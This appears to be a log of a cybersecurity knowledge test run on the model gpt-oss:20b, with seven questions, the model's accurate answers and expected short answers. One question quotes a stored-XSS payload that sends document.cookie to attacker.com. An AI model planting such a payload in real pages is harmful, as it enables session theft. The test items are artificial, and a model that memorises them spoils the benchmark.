@@ -1,0 +1,181 @@
+Cybersecurity Sanity Test Log
+Run Mode: gpt_oss_20b
+Initialized: 2025-08-08T12:07:54.663570
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-08-08T12:14:47.112374
+Model: gpt-oss:20b
+Category: Basic Definitions - Identification
+Response Time: 412.44 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+Analyze the following statement: 'The system must enforce multi-factor authentication (MFA) for all administrative access.' In the context of cybersecurity, what type of statement is this and what is its primary purpose?
+
+LLM RESPONSE:
+**Type of statement:**  
+It is a **security requirement (control specification)**—a policy‑level statement that prescribes a mandatory security control that the system must implement.
+
+**Primary purpose:**  
+To **ensure that every administrative access is protected by multi‑factor authentication**, thereby reducing the risk of credential compromise, hardening privileged accounts, and meeting security best‑practice and compliance objectives.
+
+EXPECTED SHORT ANSWER:
+This statement is a security requirement. Its purpose is to define a specific functionality or constraint (MFA) to protect critical access.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-08-08T12:17:42.444573
+Model: gpt-oss:20b
+Category: Frameworks - Application
+Response Time: 175.32 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A company experiences a ransomware attack. They activate their incident response plan to contain the damage and begin restoring systems from backups. According to the NIST Cybersecurity Framework (CSF), which two core functions are most prominently demonstrated by these actions?
+
+LLM RESPONSE:
+The actions described align with **Respond** and **Recover** in the NIST Cybersecurity Framework.
+
+- **Respond** – Activating the incident‑response plan and containing the damage are core steps of the Respond function.  
+- **Recover** – Restoring systems from backups to resume operations is a key activity of the Recover function.
+
+EXPECTED SHORT ANSWER:
+The primary functions demonstrated are 'Respond' (activating the incident plan) and 'Recover' (restoring from backups).
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-08-08T12:21:45.307480
+Model: gpt-oss:20b
+Category: Security Controls - Identification
+Response Time: 242.86 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A security policy mandates that 'all actions performed by privileged users, including logins and system changes, must be recorded in immutable, time-stamped log files.' Within the NIST SP 800-53 standard, which control family specifically addresses this type of requirement?
+
+LLM RESPONSE:
+The requirement you described is covered by the **Audit and Accountability (AU) control family** in NIST SP 800‑53.  
+
+Key controls in that family that address privileged‑user actions, time‑stamps, and immutable log creation include:
+
+- **AU‑2 – Audit Events**  
+- **AU‑6 – Audit Review, Analysis, and Reporting**  
+- **AU‑8 – Time Stamps**  
+- **AU‑12 – Audit Generation**  
+
+These controls collectively mandate that all privileged actions be logged with accurate, tamper‑resistant, time‑stamped records.
+
+EXPECTED SHORT ANSWER:
+This requirement is addressed by the 'AU' (Audit and Accountability) control family.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-08-08T12:26:00.147612
+Model: gpt-oss:20b
+Category: Vulnerabilities - Identification
+Response Time: 254.84 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A web application has a comments section where user input is directly rendered back to the page without being sanitized. An attacker posts a comment containing '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'. What is the common name for this vulnerability and what is its corresponding CWE identifier?
+
+LLM RESPONSE:
+The flaw is a **Cross‑Site Scripting (XSS)** vulnerability – in this case a **stored (persistent) XSS**.  
+Its CWE is **CWE‑79: Improper Neutralization of Input During Web Page Generation (Cross‑Site Scripting)**.
+
+EXPECTED SHORT ANSWER:
+This vulnerability is known as Cross-Site Scripting (XSS). Its corresponding identifier is CWE-79.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-08-08T12:28:36.189360
+Model: gpt-oss:20b
+Category: Threat Modeling - Classification
+Response Time: 156.04 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+During a threat modeling exercise, a team identifies a risk where an unauthorized user could intercept and alter data packets being sent between a client and a server, changing the amount of a financial transaction. Within the STRIDE threat model, which category does this threat belong to?
+
+LLM RESPONSE:
+That scenario is a **Tampering** threat in STRIDE – the attacker modifies data in transit to alter the transaction amount.
+
+EXPECTED SHORT ANSWER:
+This threat belongs to the 'Tampering' category of the STRIDE model, as it involves the unauthorized modification of data.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-08-08T12:32:59.672586
+Model: gpt-oss:20b
+Category: Regulations/Directives - Application
+Response Time: 263.48 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+Consider two security incidents in the EU: 1) A nationwide power grid operator suffers a cyberattack that disrupts electricity distribution. 2) A social media company has a data breach exposing the personal messages of millions of users. Which regulation is the primary concern for incident 1, and which for incident 2?
+
+LLM RESPONSE:
+- **Incident 1 (power‑grid cyberattack)** – The **NIS 2** directive (EU Network and Information Security regulation for essential services) is the main regulatory framework that applies to energy operators and requires incident reporting and security measures.
+
+- **Incident 2 (social‑media data breach)** – The **GDPR** (General Data Protection Regulation) is the primary concern, governing the protection of personal data and requiring breach notification and remedial action.
+
+EXPECTED SHORT ANSWER:
+Incident 1 (disruption of critical infrastructure) is primarily a concern for the NIS 2 Directive. Incident 2 (breach of personal data) is a primary concern for GDPR.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-08-08T12:34:18.591381
+Model: gpt-oss:20b
+Category: Basic Principles - Application
+Response Time: 78.91 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A cloud storage service uses data checksums (like SHA-256 hashes) to verify that files have not been altered or corrupted during upload or download. Which principle of the CIA triad is primarily being upheld by this security control?
+
+LLM RESPONSE:
+**Integrity** – the checksum verifies that the data remains unchanged, protecting the “integrity” principle of the CIA triad.
+
+EXPECTED SHORT ANSWER:
+This control primarily upholds the principle of 'Integrity'.
+
+--- End of Test Case ---
+==================================================
+
+--- Run Summary ---
+
+Model: gpt-oss:20b
+  - Total Tests: 7
+  - Total Time Spent in LLM Calls: 1583.90 seconds
+  - Average Response Time: 226.27 seconds
+
+Total Number of Test Cases Configured: 7
+
+End of Log.
